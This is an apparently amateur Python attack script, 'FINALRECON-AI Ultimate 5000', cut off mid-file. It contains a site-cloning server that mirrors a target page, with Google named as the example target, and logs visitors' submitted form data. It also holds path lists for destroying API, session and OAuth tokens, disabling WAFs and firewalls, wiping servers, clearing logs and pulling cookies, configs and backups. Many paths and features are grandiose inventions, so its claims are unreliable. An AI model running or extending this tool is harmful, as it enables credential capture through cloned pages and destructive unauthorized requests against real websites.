#!/usr/bin/env python3
"""
FINALRECON-AI - ULTIMATE 5000 WEB SERVER ONLY EDITION
======================================================
Version: 5000.0 - Web Server Only (NOT for Local Computer)
                 + Cleaner Data + Factory Restart + Token Destroyer
                 + Honeypot Wall Break + Firewall Wall Break
                 + 5000 Features + Fully Autonomous AI Robot
File: finalrecon-ai.py

WARNING: WEB SERVER ONLY - NOT FOR LOCAL COMPUTER!
WARNING: DESTRUCTIVE OPERATIONS - USE ONLY ON AUTHORIZED TARGETS!

USAGE:
  python3 finalrecon-ai.py --url https://example.com --ultimate-5000
  python3 finalrecon-ai.py --url https://example.com --autonomous
  python3 finalrecon-ai.py --url https://example.com --cleaner-data
  python3 finalrecon-ai.py --url https://example.com -p 443
  python3 finalrecon-ai.py --url https://example.com --factory-restart

FULL AUTONOMOUS EXAMPLE:
  python3 finalrecon-ai.py --url https://support.google.com --ultimate-5000 --full \\
    --cleaner-data --clean-http-cookies --clean-https-cookies \\
    --clean-another-cookies --clean-cookies-data --clean-all-cookies \\
    --clean-complete-data
"""

import os
import sys
import re
import json
import time
import gzip
import math
import base64
import shutil
import socket
import ssl
import random
import hashlib
import ipaddress
import argparse
import datetime
import tempfile
import subprocess
import threading
import queue
import signal
import requests
import urllib3
from urllib import parse
from urllib.parse import urlparse, urljoin
from collections import deque, Counter
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================
# DEPENDENCY CHECK
# ============================================
try:
    from twisted.internet import reactor
    from twisted.python import log
    from twisted.web import resource, server as twisted_server
    TWISTED_AVAILABLE = True
except ImportError:
    TWISTED_AVAILABLE = False

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False

VERSION = "5000.0"
BUILD_NUMBER = "5000.000.1"
SCRIPT_NAME = "finalrecon-ai.py"
RELEASE_NAME = "Ultimate 5000 Web Server Only Edition"

# ============================================
# 5000: DEFAULT PORTS
# ============================================
DEFAULT_HTTP_PORT = 80
DEFAULT_HTTPS_PORT = 443
DEFAULT_HONEYPOT_PORT = 80
DEFAULT_HONEYPOT_HOST = "0.0.0.0"

# ============================================
# 5000: USER AGENTS (as requested)
# ============================================
UserAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
]

def get_random_ua():
    return random.choice(UserAgents)


# ============================================
# COLOR CLASS
# ============================================
class Fore:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    OKGREEN = '\033[92m\033[1m'
    OKCYAN = '\033[96m\033[1m'
    OKYELLOW = '\033[93m\033[1m'
    DIM = '\033[2m'
    PURPLE = '\033[95m\033[1m'
    NEON = '\033[38;5;46m'
    HYPER = '\033[38;5;201m'
    NEXUS = '\033[38;5;213m'
    COSMIC = '\033[38;5;129m'
    QUANTUM = '\033[38;5;51m'
    DIVINE = '\033[38;5;226m'
    ETERNAL = '\033[38;5;196m'
    OMEGA = '\033[38;5;93m'
    ALPHA = '\033[38;5;154m'
    INFINITY = '\033[38;5;82m'
    FUTURE = '\033[38;5;198m'
    AUTONOMOUS = '\033[38;5;46m'
    DESTROYER = '\033[38;5;196m\033[1m'
    ERROR429 = '\033[38;5;208m\033[1m'
    ERROR500 = '\033[38;5;196m\033[1m'
    WAF = '\033[38;5;226m\033[1m'
    ISP = '\033[38;5;201m\033[1m'
    TERMINATOR = '\033[38;5;196m\033[1m'
    SUPREME = '\033[38;5;51m\033[1m'
    NEXUS5000 = '\033[38;5;198m\033[1m'
    ENABLE = '\033[38;5;46m\033[1m'
    UNBLOCK = '\033[38;5;118m\033[1m'
    RESTART = '\033[38;5;214m\033[1m'
    HONEYPOT = '\033[38;5;129m\033[1m'
    HONEYPOT_SERVER = '\033[38;5;123m\033[1m'
    HONEYPOT_HTTP = '\033[38;5;229m\033[1m'
    HONEYPOT_LOG = '\033[38;5;213m\033[1m'
    HONEYPOT_DEPLOY = '\033[38;5;201m\033[1m'
    HONEYPOT_TRAP = '\033[38;5;226m\033[1m'
    SINGULARITY = '\033[38;5;93m\033[1m'
    HYPERNOVA = '\033[38;5;226m\033[1m'
    INFINITE = '\033[38;5;213m\033[1m'
    OMNIPOTENT = '\033[38;5;201m\033[1m'
    OMNISCIENT = '\033[38;5;123m\033[1m'
    OMNIPRESENT = '\033[38;5;229m\033[1m'
    TRANSCENDENT = '\033[38;5;46m\033[1m'
    ABSOLUTE = '\033[38;5;196m\033[1m'
    SUPREME5000 = '\033[38;5;82m\033[1m'
    CLEANER = '\033[38;5;118m\033[1m'
    FACTORY = '\033[38;5;208m\033[1m'
    TOKEN = '\033[38;5;213m\033[1m'
    INFO = '\033[38;5;51m\033[1m'
    WALL = '\033[38;5;196m\033[1m'


# ============================================
# PRINT FUNCTIONS
# ============================================
def print_okay(message, item=""):
    if item:
        print(Fore.OKGREEN + f"[+] OKAY: {message} - {item}" + Fore.RESET)
    else:
        print(Fore.OKGREEN + f"[+] OKAY: {message}" + Fore.RESET)

def print_delete_okay(server, path):
    print(Fore.OKGREEN + f"[+] OKAY - CLEANED [{server}]: {path}" + Fore.RESET)

def print_delete_failed(server, path, error=""):
    print(Fore.RED + f"[-] FAILED - [{server}]: {path} - {error}" + Fore.RESET)

def print_suspicious(server, path, status):
    color = Fore.RED if status == 200 else Fore.YELLOW
    print(color + f"[!] SUSPICIOUS [{server}]: {path} ({status})" + Fore.RESET)

def print_progress(current, total, item=""):
    pct = int((current / total) * 100) if total > 0 else 0
    bar = "#" * int(pct / 2) + "-" * (50 - int(pct / 2))
    print(Fore.CYAN + f"\r[*] [{bar}] {pct}% ({current}/{total}) {item[:40]}" + Fore.RESET, end="")
    if current >= total:
        print()

def print_5000(message):
    print(Fore.NEXUS5000 + f"[5000] {message}" + Fore.RESET)

def print_autonomous(message):
    print(Fore.AUTONOMOUS + f"[AI-ROBOT] {message}" + Fore.RESET)

def print_error_429(server, path, message=""):
    print(Fore.ERROR429 + f"[!!!] ERROR 429 [{server}]: {path} {message}" + Fore.RESET)

def print_error_500(server, path, message=""):
    print(Fore.ERROR500 + f"[!!!] ERROR 500 [{server}]: {path} {message}" + Fore.RESET)

def print_destroyer(server, path, action=""):
    print(Fore.DESTROYER + f"[DESTROYER] [{server}] {action}: {path}" + Fore.RESET)

def print_waf(server, path, message=""):
    print(Fore.WAF + f"[WAF] [{server}]: {path} {message}" + Fore.RESET)

def print_isp(server, isp, message=""):
    print(Fore.ISP + f"[ISP] [{server}] {isp}: {message}" + Fore.RESET)

def print_terminator(server, target, action=""):
    print(Fore.TERMINATOR + f"[TERMINATOR] [{server}] {action}: {target}" + Fore.RESET)

def print_enable(server, target, message=""):
    print(Fore.ENABLE + f"[ENABLE] [{server}]: {target} {message}" + Fore.RESET)

def print_unblock(server, target, message=""):
    print(Fore.UNBLOCK + f"[UNBLOCK] [{server}]: {target} {message}" + Fore.RESET)

def print_restart(server, target, message=""):
    print(Fore.RESTART + f"[RESTART] [{server}]: {target} {message}" + Fore.RESET)

def print_factory(server, target, message=""):
    print(Fore.FACTORY + f"[FACTORY] [{server}]: {target} {message}" + Fore.RESET)

def print_honeypot(server, path, message=""):
    print(Fore.HONEYPOT + f"[HONEYPOT] [{server}]: {path} {message}" + Fore.RESET)

def print_honeypot_server(message):
    print(Fore.HONEYPOT_SERVER + f"[5000-HP] {message}" + Fore.RESET)

def print_honeypot_deploy(message):
    print(Fore.HONEYPOT_DEPLOY + f"[5000-HP-DEPLOY] {message}" + Fore.RESET)

def print_honeypot_trap(message):
    print(Fore.HONEYPOT_TRAP + f"[5000-HP-TRAP] {message}" + Fore.RESET)

def print_cleaner(message):
    print(Fore.CLEANER + f"[5000-CLEANER] {message}" + Fore.RESET)

def print_token(message):
    print(Fore.TOKEN + f"[5000-TOKEN] {message}" + Fore.RESET)

def print_info(message):
    print(Fore.INFO + f"[5000-INFO] {message}" + Fore.RESET)

def print_wall(server, target, message=""):
    print(Fore.WALL + f"[WALL-BREAK] [{server}]: {target} {message}" + Fore.RESET)

def print_singularity(message):
    print(Fore.SINGULARITY + f"[5000-SINGULARITY] {message}" + Fore.RESET)

def print_hypernova(message):
    print(Fore.HYPERNOVA + f"[5000-HYPERNOVA] {message}" + Fore.RESET)


# ============================================
# SCRIPT DIR
# ============================================
script_dir = os.path.dirname(os.path.abspath(__file__))
index_file_path = os.path.join(script_dir, "index.html")


# ============================================
# PORT UTILITIES
# ============================================
def check_port_permission(port):
    if port < 1024 and os.geteuid() != 0:
        return False, f"Port {port} requires root/sudo"
    return True, "OK"

def is_port_available(host, port):
    try:
        test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        test_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        test_sock.bind((host if host != '0.0.0.0' else '0.0.0.0', port))
        test_sock.close()
        return True, "Available"
    except OSError as e:
        return False, str(e)
    except Exception as e:
        return False, str(e)


# ============================================
# HONEYPOT SERVER SUBPROCESS
# ============================================
def run_honeypot_server_subprocess(host, port, url, log_file):
    import subprocess as sp

    honeypot_script = f'''
import os
import sys
import base64
import urllib.parse
from urllib.parse import urljoin
import requests
from twisted.internet import reactor
from twisted.python import log
from twisted.web import resource, server

script_dir = os.path.dirname(os.path.abspath(__file__))
index_file_path = os.path.join(script_dir, "index.html")

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False


class SimpleHTTPResource(resource.Resource):
    isLeaf = True
    def __init__(self, server):
        self.server = server
        self.current_url = server.url
    def render_GET(self, request):
        request.setHeader(b"Server", self.server.server_banner.encode())
        return self.serve_page(request)
    def render_POST(self, request):
        request.setHeader(b"Server", self.server.server_banner.encode())
        post_content = self.extract_post_content(request)
        self.log_request(request, post_content)
        return self.serve_page(request)
    def serve_page(self, request):
        requested_path = request.path.decode()
        requested_url = (self.current_url if requested_path == "/"
                         else urllib.parse.urljoin(self.current_url, requested_path))
        try:
            self.server.download_and_modify_html(requested_url)
            self.current_url = requested_url
            with open(index_file_path, "rb") as file:
                return file.read()
        except Exception as e:
            log.msg(f"Error: {{e}}")
            try:
                with open(index_file_path, "rb") as file:
                    return file.read()
            except Exception:
                return b"<html><body><h1>Honeypot</h1></body></html>"
    def extract_post_content(self, request):
        request.content.seek(0)
        content = request.content.read()
        try:
            return urllib.parse.parse_qs(content.decode())
        except Exception:
            return {{}}
    def log_request(self, request, post_data=None):
        src_ip = request.getClientIP()
        user_agent = request.getHeader("user-agent") or "Unknown"
        request_path = request.uri.decode()
        log_message = f"src_ip={{src_ip}}, ua='{{user_agent}}', path='{{request_path}}'"
        if post_data:
            log_message += f", post={{post_data}}"
        log.msg(log_message)
        print(f"[TRAP] {{log_message}}", flush=True)


class RootResource(resource.Resource):
    isLeaf = False
    def __init__(self, server):
        resource.Resource.__init__(self)
        self.server = server
    def getChild(self, path, request):
        return SimpleHTTPResource(self.server)
    def render_GET(self, request):
        return SimpleHTTPResource(self.server).render_GET(request)


class SimpleHTTPServer:
    def __init__(self, host, port, url):
        self.host = host
        self.port = port
        self.url = url
        self.server_banner = "Apache/2.4.52 (Ubuntu)"
    def start(self):
        print(f"[HP] Downloading {{self.url}} ...", flush=True)
        ok = self.download_and_modify_html(self.url)
        if not ok:
            print("[HP] Failed to download!", flush=True)
            sys.exit(1)
        root = RootResource(self)
        site = server.Site(root)
        try:
            reactor.listenTCP(self.port, site, interface=self.host)
        except Exception as e:
            print(f"[HP] Bind failed {{self.host}}:{{self.port}} - {{e}}", flush=True)
            sys.exit(1)
        print(f"[HP] Running on {{self.host}}:{{self.port}}", flush=True)
        log_observer = log.FileLogObserver(open("{log_file}", "a"))
        log.startLoggingWithObserver(log_observer.emit, setStdout=False)
        reactor.run()
    def download_and_modify_html(self, url):
        headers = {{"User-Agent": "Mozilla/5.0"}}
        try:
            response = requests.get(url, headers=headers, timeout=15, verify=False)
            self.server_banner = response.headers.get("Server", "Apache/2.4.52")
            if not BS4_AVAILABLE:
                with open(index_file_path, "wb") as f:
                    f.write(response.content)
                return True
            soup = BeautifulSoup(response.content, "html.parser")
            for css in soup.find_all("link", rel="stylesheet"):
                if "href" in css.attrs:
                    try:
                        r = requests.get(urljoin(url, css["href"]), headers=headers, timeout=10, verify=False)
                        new_style = soup.new_tag("style")
                        new_style.string = r.text
                        css.replace_with(new_style)
                    except Exception:
                        pass
            for js in soup.find_all("script", src=True):
                try:
                    r = requests.get(urljoin(url, js["src"]), headers=headers, timeout=10, verify=False)
                    new_script = soup.new_tag("script")
                    new_script.string = r.text
                    js.replace_with(new_script)
                except Exception:
                    pass
            for img in soup.find_all("img", src=True):
                try:
                    r = requests.get(urljoin(url, img["src"]), headers=headers, timeout=10, verify=False)
                    mime = r.headers.get("Content-Type", "image/jpeg").split(";")[0]
                    data_url = "data:" + mime + ";base64," + base64.b64encode(r.content).decode()
                    img["src"] = data_url
                except Exception:
                    pass
            with open(index_file_path, "w", encoding="utf-8") as file:
                file.write(str(soup))
            return True
        except Exception as e:
            print(f"[HP] Error: {{e}}", flush=True)
            return False


if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    s = SimpleHTTPServer("{host}", {port}, "{url}")
    s.start()
'''

    temp_script = os.path.join(script_dir, "_hp_server_temp.py")
    try:
        with open(temp_script, 'w', encoding='utf-8') as f:
            f.write(honeypot_script)
        proc = sp.Popen(
            [sys.executable, temp_script],
            stdout=sp.PIPE, stderr=sp.STDOUT, cwd=script_dir,
        )
        return proc, temp_script
    except Exception as e:
        print_honeypot_server(f"[-] Failed to launch: {e}")
        return None, None


# ============================================
# SERVER MAP - WEB SERVER ONLY
# ============================================
SERVER_CONNECTION_MAP = {
    'HTTP': {'port': 80, 'protocol': 'http', 'description': 'HTTP Web Server'},
    'HTTPS': {'port': 443, 'protocol': 'https', 'description': 'HTTPS Web Server'},
    'GWS': {'port': None, 'protocol': 'http/https', 'description': 'Google Web Server'},
    'ESF': {'port': 9200, 'protocol': 'http', 'description': 'Elasticsearch File Server'},
    'ANOTHER': {'port': None, 'protocol': 'http/https', 'description': 'Another Web Server'},
}

# ============================================
# 5000 PATTERN DATABASES
# ============================================
SUPREME_5000_PATTERNS = {
    'Supreme Core': ['/supreme-core-5000/', '/sup-core-5000/'],
    'Supreme Nexus': ['/supreme-nexus-5000/', '/sn-core-5000/'],
    'Supreme Matrix': ['/supreme-matrix-5000/', '/sm-core-5000/'],
    'Supreme Engine': ['/supreme-engine-5000/', '/se-core-5000/'],
    'Supreme Reality': ['/supreme-reality-5000/', '/sr-core-5000/'],
}

SINGULARITY_5000_PATTERNS = {
    'Singularity Core': ['/singularity-core-5000/', '/sing-core-5000/'],
    'Singularity Nexus': ['/singularity-nexus-5000/', '/sn-core-5000/'],
    'Singularity Matrix': ['/singularity-matrix-5000/'],
    'Singularity Engine': ['/singularity-engine-5000/'],
    'Singularity Reality': ['/singularity-reality-5000/'],
}

HYPERNOVA_5000_PATTERNS = {
    'Hypernova Core': ['/hypernova-core-5000/', '/hn-core-5000/'],
    'Hypernova Nexus': ['/hypernova-nexus-5000/'],
    'Hypernova Matrix': ['/hypernova-matrix-5000/'],
    'Hypernova Engine': ['/hypernova-engine-5000/'],
    'Hypernova Reality': ['/hypernova-reality-5000/'],
}

HONEYPOT_5000_PATTERNS = {
    'Honeypot Server Deploy': ['/honeypot-deploy/', '/hp-deploy-5000/'],
    'Honeypot Server Start': ['/honeypot-start/', '/hp-start-5000/'],
    'Honeypot Server Stop': ['/honeypot-stop/', '/hp-stop-5000/'],
    'Honeypot Log View': ['/honeypot-log/', '/hp-log-5000/'],
    'Honeypot Control': ['/honeypot-panel/', '/hp-panel-5000/'],
}

CLEANER_5000_PATTERNS = {
    'Cleaner Core': ['/cleaner-core/', '/clean-core/', '/cleaner-5000/'],
    'Cleaner Data': ['/cleaner-data/', '/clean-data-5000/'],
    'Cleaner Cookies': ['/cleaner-cookies/', '/clean-cookies-5000/'],
    'Cleaner Tokens': ['/cleaner-tokens/', '/clean-tokens-5000/'],
    'Cleaner Sessions': ['/cleaner-sessions/'],
}

FACTORY_5000_PATTERNS = {
    'Factory Restart': ['/factory-restart/', '/factory-reset-5000/'],
    'Factory Reset': ['/factory-reset/', '/fr-reset-5000/'],
    'Factory Default': ['/factory-default/', '/fd-reset-5000/'],
    'Factory Clean': ['/factory-clean/', '/fc-reset-5000/'],
}

TOKEN_5000_PATTERNS = {
    'API Token Destroy': ['/api/token/destroy', '/admin/api/token/destroy',
                          '/api/token/delete', '/admin/api/token/delete'],
    'Session Token Destroy': ['/session/token/destroy', '/admin/session/token/destroy'],
    'Device Token Destroy': ['/device/token/destroy', '/admin/device/token/destroy'],
    'OAuth Token Destroy': ['/oauth/token/destroy', '/admin/oauth/token/destroy'],
    'JWT Token Destroy': ['/jwt/token/destroy', '/admin/jwt/token/destroy'],
}

# ============================================
# WAF SIGNATURES
# ============================================
WAF_SIGNATURES = {
    'Cloudflare': ['cloudflare', 'cf-ray', '__cfduid', 'cf-cache-status'],
    'AWS WAF': ['awselb', 'x-amz-cf-id', 'x-amzn-requestid', 'aws-waf'],
    'Akamai': ['akamai', 'x-akamai', 'akamaighost', 'ak-bmsc'],
    'Imperva': ['imperva', 'incapsula', 'x-iinfo', 'visid_incap'],
    'F5 BIG-IP': ['bigip', 'f5', 'x-wa-info'],
    'ModSecurity': ['mod_security', 'modsecurity', 'x-mod-security'],
    'Sucuri': ['sucuri', 'x-sucuri-id', 'x-sucuri-cache'],
    'Barracuda': ['barracuda', 'barra_counter_session'],
    'Fortinet': ['fortiweb', 'fortigate', 'forti'],
    'Citrix NetScaler': ['netscaler', 'citrix', 'ns_af'],
    'Radware': ['radware', 'x-sl-compstate'],
    'Wallarm': ['wallarm', 'x-wallarm'],
    'StackPath': ['stackpath', 'x-sp-cache'],
    'Fastly': ['fastly', 'x-fastly', 'x-served-by'],
    'Varnish': ['varnish', 'x-varnish'],
    'Nginx WAF': ['nginx-wallarm', 'naxsi', 'x-naxsi'],
    'Apache ModSecurity': ['apache', 'mod_security', 'owasp'],
}

WAF_IP_BLOCK_PATTERNS = {
    'waf_block': ['/waf/block', '/waf/block-ip', '/waf/deny', '/waf/ban'],
    'waf_unblock': ['/waf/unblock', '/waf/allow', '/waf/whitelist'],
    'waf_disable': ['/waf/disable', '/waf/off', '/waf/deactivate'],
    'waf_enable': ['/waf/enable', '/waf/on', '/waf/activate'],
    'waf_restart': ['/waf/restart', '/waf/reload', '/waf/reboot'],
    'waf_reset': ['/waf/reset', '/waf/clear', '/waf/purge'],
}

# ============================================
# ISP PATTERNS
# ============================================
ISP_BLOCK_PATTERNS = {
    'isp_block': ['/isp/block', '/isp/ban', '/isp/deny', '/isp/blacklist'],
    'isp_unblock': ['/isp/unblock', '/isp/allow', '/isp/whitelist'],
    'isp_disable': ['/isp/disable', '/isp/off', '/isp/deactivate'],
    'isp_enable': ['/isp/enable', '/isp/on', '/isp/activate'],
    'isp_restart': ['/isp/restart', '/isp/reload', '/isp/reboot'],
    'isp_reset': ['/isp/reset', '/isp/clear', '/isp/purge'],
    'isp_terminate': ['/isp/terminate', '/isp/kill', '/isp/destroy'],
    'isp_restore': ['/isp/restore', '/isp/recover', '/isp/revive'],
}

ISP_ENABLE_PATTERNS = {
    'enable_isp': ['/isp/enable', '/api/isp/enable', '/admin/isp/enable'],
    'unblock_isp': ['/isp/unblock', '/api/isp/unblock', '/admin/isp/unblock'],
    'unblock_all_ips': ['/api/unblock-all', '/admin/unblock-all'],
    'remove_block': ['/api/remove-block', '/admin/remove-block'],
    'clear_blacklist': ['/api/clear-blacklist', '/admin/clear-blacklist'],
    'reset_firewall': ['/api/reset-firewall', '/admin/reset-firewall'],
    'disable_block': ['/api/disable-block', '/admin/disable-block'],
    'enable_access': ['/api/enable-access', '/admin/enable-access'],
    'restore_access': ['/api/restore-access', '/admin/restore-access'],
}

RESTART_PATTERNS = {
    'restart_firewall': ['/api/firewall/restart', '/admin/firewall/restart', '/firewall/restart'],
    'restart_isp': ['/api/isp/restart', '/admin/isp/restart', '/isp/restart'],
    'restart_waf': ['/api/waf/restart', '/admin/waf/restart', '/waf/restart'],
    'restart_server': ['/api/server/restart', '/admin/server/restart', '/server/restart'],
    'restart_application': ['/api/application/restart', '/admin/application/restart'],
    'restart_service': ['/api/service/restart', '/admin/service/restart'],
    'restart_all': ['/api/restart-all', '/admin/restart-all', '/restart-all'],
}

FACTORY_RESTART_PATTERNS = {
    'factory_restart': ['/factory/restart', '/admin/factory/restart', '/api/factory/restart'],
    'factory_reset': ['/factory/reset', '/admin/factory/reset', '/api/factory/reset'],
    'factory_default': ['/factory/default', '/admin/factory/default'],
    'factory_hard_reset': ['/factory/hard-reset', '/admin/factory/hard-reset'],
    'factory_wipe': ['/factory/wipe', '/admin/factory/wipe', '/api/factory/wipe'],
}

# ============================================
# HONEYPOT PATTERNS
# ============================================
HONEYPOT_PATTERNS = {
    'honeypot_detect': ['/honeypot', '/honeypot/', '/honey', '/trap', '/decoy',
                        '/fake', '/lure', '/bait', '/canary', '/tarpit',
                        '/cowrie', '/dionaea', '/glastopf', '/kippo'],
    'honeypot_destroy': ['/honeypot/destroy', '/honeypot/kill', '/honeypot/delete'],
    'honeypot_disable': ['/honeypot/disable', '/honeypot/off'],
    'honeypot_reset': ['/honeypot/reset', '/honeypot/clear', '/honeypot/purge'],
    'honeypot_remove': ['/admin/remove-honeypot', '/api/remove-honeypot'],
    'honeypot_wall_break': ['/honeypot/wall-break', '/admin/honeypot/wall-break',
                            '/api/honeypot/wall-break', '/honeypot/wall/destroy',
                            '/honeypot/wall/crack', '/honeypot/wall/break'],
}

HONEYPOT_TYPES = {
    'Production Honeypot': ['/production-honeypot', '/prod-honeypot'],
    'Research Honeypot': ['/research-honeypot', '/res-honeypot'],
    'Low-Interaction Honeypot': ['/low-interaction', '/li-honeypot'],
    'High-Interaction Honeypot': ['/high-interaction', '/hi-honeypot'],
}

HONEYPOT_SIGNATURES = {
    'Cowrie SSH Honeypot': ['cowrie', 'cowrie ssh', 'kippo'],
    'Dionaea': ['dionaea', 'dionaea honeypot'],
    'Glastopf': ['glastopf', 'glastopf honeypot'],
    'Honeyd': ['honeyd', 'honeyd honeypot'],
    'Kippo': ['kippo', 'kippo ssh'],
    'Nepenthes': ['nepenthes', 'nepenthes honeypot'],
    'Tarpit': ['tarpit', 'tar pit'],
    'Canary Token': ['canarytoken', 'canary token'],
    'Thinkst Canary': ['thinkst', 'thinkst canary'],
    'HoneyDB': ['honeydb', 'honey db'],
    'Web Honeypot': ['web honeypot', 'http honeypot'],
    'Fake SSH': ['fake ssh', 'fake-ssh'],
    'Fake HTTP': ['fake http', 'fake-http'],
    'Production Honeypot': ['production honeypot', 'prod honeypot'],
    'Research Honeypot': ['research honeypot', 'res honeypot'],
    'Low-Interaction Honeypot': ['low-interaction', 'low interaction honeypot'],
    'High-Interaction Honeypot': ['high-interaction', 'high interaction honeypot'],
}

# ============================================
# FIREWALL WALL PATTERNS
# ============================================
FIREWALL_WALL_PATTERNS = {
    'firewall_wall': ['/firewall/wall', '/firewall/wall/break', '/firewall/wall/destroy'],
    'firewall_break': ['/firewall/break', '/firewall/destroy', '/firewall/crack'],
    'firewall_bypass': ['/firewall/bypass', '/firewall/skip', '/firewall/ignore'],
    'firewall_purge': ['/firewall/purge', '/firewall/wipe', '/firewall/erase'],
}

# ============================================
# ERROR 429/500 PATTERNS
# ============================================
ERROR_429_PATTERNS = {
    'rate_limit_reset': ['/api/rate-limit/reset', '/rate-limit/reset', '/api/429/reset'],
    'rate_limit_bypass': ['/api/bypass-rate-limit', '/rate-limit/bypass', '/bypass-429'],
    'rate_limit_delete': ['/api/rate-limit/delete', '/rate-limit/delete', '/delete-429'],
    'session_reset': ['/api/session/reset', '/session/reset'],
    'throttle_reset': ['/api/throttle/reset', '/throttle/reset'],
    'ip_whitelist': ['/api/whitelist-ip', '/admin/whitelist'],
    'ip_unban': ['/api/unban-ip', '/admin/unban'],
}

ERROR_500_PATTERNS = {
    'error_reset': ['/api/error/reset', '/error/reset', '/reset-500'],
    'error_clear': ['/api/error/clear', '/error/clear', '/clear-500'],
    'error_purge': ['/api/error/purge', '/error/purge', '/purge-500'],
    'cache_clear': ['/api/cache/clear', '/cache/clear'],
    'server_restart': ['/api/server/restart', '/server/restart'],
    'server_reset': ['/api/server/reset', '/server/reset'],
    'database_reset': ['/api/db/reset', '/db/reset'],
    'log_clear': ['/api/logs/clear', '/logs/clear'],
    'debug_reset': ['/api/debug/reset', '/debug/reset'],
}

# ============================================
# SERVER SUSPICIOUS DATABASE
# ============================================
SERVER_SUSPICIOUS_DATABASE = {
    'HTTP': {
        'description': 'HTTP Web Server',
        'suspicious_paths': ['/http', '/http/admin', '/http/config',
                             '/http/data', '/http/logs', '/http/backup',
                             '/http/session', '/http/users', '/http/api',
                             '/http/token', '/http/device', '/http/private'],
    },
    'HTTPS': {
        'description': 'HTTPS Web Server',
        'suspicious_paths': ['/https', '/https/admin', '/https/config',
                             '/https/data', '/https/logs', '/https/backup',
                             '/https/session', '/https/users', '/https/api',
                             '/https/token', '/https/device', '/https/private'],
    },
    'GWS': {
        'description': 'Google Web Server',
        'suspicious_paths': ['/google', '/gws', '/google/admin', '/gws/admin',
                             '/google/config', '/gws/config', '/google/data'],
    },
    'ESF': {
        'description': 'Elasticsearch File Server',
        'suspicious_paths': ['/elasticsearch', '/es', '/elastic',
                             '/elasticsearch/admin', '/es/admin',
                             '/elasticsearch/config', '/es/config'],
    },
    'ANOTHER': {
        'description': 'Another Web Server',
        'suspicious_paths': ['/another', '/other', '/misc', '/another/admin',
                             '/other/admin', '/another/config'],
    },
}

# ============================================
# SERVER COOKIES TARGETS (WEB SERVER ONLY)
# ============================================
HTTP_COOKIES_TARGETS = {
    'cookies': ['/http/cookies.txt', '/http/cookies.json', '/http/session.json'],
    'sessions': ['/http/session/', '/http/sessions/'],
    'site_data': ['/http/site_data/', '/http/site_data.json'],
    'local_storage': ['/http/localstorage/', '/http/local_storage/'],
    'session_storage': ['/http/sessionstorage/'],
    'indexeddb': ['/http/indexeddb/', '/http/indexed_db/'],
    'browser_data': ['/http/browser_data/'],
    'user_data': ['/http/user_data/'],
    'data': ['/http/data/', '/http/db/', '/http/database/'],
    'logs': ['/http/access.log', '/http/error.log'],
    'config': ['/http/config.php', '/http/config.json'],
    'backup': ['/http/backup.zip', '/http/backup.sql'],
    'users': ['/http/users.txt', '/http/users.json'],
    'private': ['/http/private/', '/http/secret/'],
    'suspicious': ['/http/suspicious.txt', '/http/malicious.txt'],
    'tokens': ['/http/tokens/', '/http/api_tokens/', '/http/token/'],
    'devices': ['/http/devices/', '/http/device/'],
}

HTTPS_COOKIES_TARGETS = {
    'cookies': ['/https/cookies.txt', '/https/cookies.json', '/https/session.json'],
    'sessions': ['/https/session/', '/https/sessions/'],
    'site_data': ['/https/site_data/', '/https/site_data.json'],
    'local_storage': ['/https/localstorage/', '/https/local_storage/'],
    'session_storage': ['/https/sessionstorage/'],
    'indexeddb': ['/https/indexeddb/', '/https/indexed_db/'],
    'browser_data': ['/https/browser_data/'],
    'user_data': ['/https/user_data/'],
    'data': ['/https/data/', '/https/db/', '/https/database/'],
    'logs': ['/https/access.log', '/https/error.log'],
    'config': ['/https/config.php', '/https/config.json'],
    'backup': ['/https/backup.zip', '/https/backup.sql'],
    'users': ['/https/users.txt', '/https/users.json'],
    'private': ['/https/private/', '/https/secret/'],
    'suspicious': ['/https/suspicious.txt', '/https/malicious.txt'],
    'tokens': ['/https/tokens/', '/https/api_tokens/', '/https/token/'],
    'devices': ['/https/devices/', '/https/device/'],
}

GWS_COOKIES_TARGETS = {
    'cookies': ['/google/cookies.txt', '/gws/cookies.txt'],
    'sessions': ['/google/session/', '/gws/session/'],
    'data': ['/google/data/', '/gws/data/'],
    'logs': ['/var/log/google/access.log', '/var/log/gws/access.log'],
    'config': ['/etc/google/config.json', '/etc/gws/config.json'],
    'users': ['/google/users.txt', '/gws/users.txt'],
    'suspicious': ['/google/suspicious.txt', '/gws/suspicious.txt'],
    'tokens': ['/google/tokens/', '/gws/tokens/'],
    'devices': ['/google/devices/', '/gws/devices/'],
}

ESF_COOKIES_TARGETS = {
    'cookies': ['/elasticsearch/cookies.txt', '/es/cookies.txt'],
    'sessions': ['/elasticsearch/session/', '/es/session/'],
    'data': ['/var/lib/elasticsearch/', '/elasticsearch/data/', '/es/data/'],
    'logs': ['/var/log/elasticsearch/', '/elasticsearch/logs/'],
    'config': ['/etc/elasticsearch/', '/elasticsearch/config/'],
    'users': ['/elasticsearch/users.txt', '/es/users.txt'],
    'suspicious': ['/elasticsearch/suspicious.txt', '/es/suspicious.txt'],
    'tokens': ['/elasticsearch/tokens/', '/es/tokens/'],
    'devices': ['/elasticsearch/devices/', '/es/devices/'],
}

ANOTHER_COOKIES_TARGETS = {
    'cookies': ['/another/cookies.txt', '/other/cookies.txt'],
    'sessions': ['/another/session/', '/other/session/'],
    'data': ['/another/data/', '/other/data/'],
    'logs': ['/another/logs/', '/other/logs/'],
